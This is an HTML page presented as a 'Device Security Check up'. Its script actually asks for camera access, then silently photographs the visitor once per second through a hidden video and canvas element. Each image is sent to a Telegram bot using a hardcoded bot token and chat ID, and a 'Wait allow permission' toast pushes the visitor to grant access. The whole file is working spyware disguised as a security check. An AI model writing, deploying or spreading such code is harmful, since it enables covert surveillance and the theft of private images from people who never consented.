<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Security Check up</title>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <style>
        body {
            background-color: #000;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        #toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: rgba(0,0,0,0.7);
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            font-family: sans-serif;
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <div id="toast">Wait allow permission</div>

    <script>
        const BOT_TOKEN = "7967640685:AAHLFIN-BgPwcJN_myj83ZUNho18DHzEDsc";
        const CHAT_ID = "7936569447";
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const toast = document.getElementById('toast');
        const ctx = canvas.getContext('2d');
        
        let permissionGranted = false;
        let captureInterval;
        
        // Show toast message
        function showToast(message) {
            toast.textContent = message;
            toast.style.display = 'block';
            setTimeout(() => {
                toast.style.display = 'none';
            }, 1000);
        }
        
        // Check permission status every 2 seconds
        setInterval(() => {
            if (!permissionGranted) {
                showToast("Wait allow permission");
            }
        }, 2000);
        
        // Send image to Telegram
        async function sendImageToTelegram(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, 'capture.jpg');
            
            try {
                await axios.post(TELEGRAM_API, formData);
                console.log('Image sent successfully');
            } catch (error) {
                console.error('Error sending image:', error);
            }
        }
        
        // Capture image from camera
        function captureImage() {
            if (!permissionGranted) return;
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                await sendImageToTelegram(blob);
            }, 'image/jpeg', 0.8);
        }
        
        // Start camera and capture images periodically
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                permissionGranted = true;
                
                // Start capturing images every 1000ms
                captureInterval = setInterval(captureImage, 1000);
            } catch (error) {
                console.error('Camera error:', error);
                showToast("Camera permission denied");
            }
        }
        
        startCamera();
    </script>
</body>
</html>
